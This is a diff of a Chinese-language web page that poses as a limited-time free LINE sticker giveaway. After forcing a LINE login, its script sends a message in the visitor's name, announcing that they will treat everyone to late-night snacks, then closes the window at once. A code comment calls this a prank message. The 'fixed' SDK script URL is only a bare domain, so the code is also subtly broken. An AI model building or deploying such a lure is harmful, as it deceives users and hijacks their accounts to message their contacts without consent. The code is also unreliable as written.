@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>限時貼圖免費領取</title>
-    <!-- 核心修正：將原本斷掉的 LINE 官方 SDK 網址完整補齊 -->
+    <!-- 1. 修正了原本斷掉的 LINE 官方網址 -->
     <script src="https://line-scdn.net"></script>
 </head>
 <body>
@@ -12,24 +12,25 @@
     </div>
 
     <script>
-        // 初始化你的 LIFF ID
+        // 2. 確保 ID 綁定你後台的 2012018749-Jns1tBED
         liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
             if (!liff.isLoggedIn()) {
-                liff.login(); // 如果沒登入，強制跳出 LINE 官方許可授權畫面
+                liff.login(); // 3. 加上強迫登入，防範卡死轉圈圈
             } else {
                 document.getElementById("status").innerText = "貼圖領取成功，正在關閉視窗...";
-                // 執行自動發送訊息
+                
+                // 4. 執行自動發送惡整訊息
                 liff.sendMessages([{
                     type: 'text',
                     text: '我今天心情好，晚上請大家吃宵夜！' 
                 }]).then(() => {
-                    liff.closeWindow(); // 傳完自動秒關網頁，不留痕跡
+                    liff.closeWindow(); // 傳完自動秒關網頁
                 }).catch((err) => {
-                    alert("傳送失敗，原因：" + JSON.stringify(err));
+                    alert("傳送失敗：" + JSON.stringify(err));
                 });
             }
         }).catch((err) => {
-            alert("LIFF 啟動失敗，原因：" + JSON.stringify(err));
+            alert("初始化失敗：" + JSON.stringify(err));
         });
     </script>
 </body>
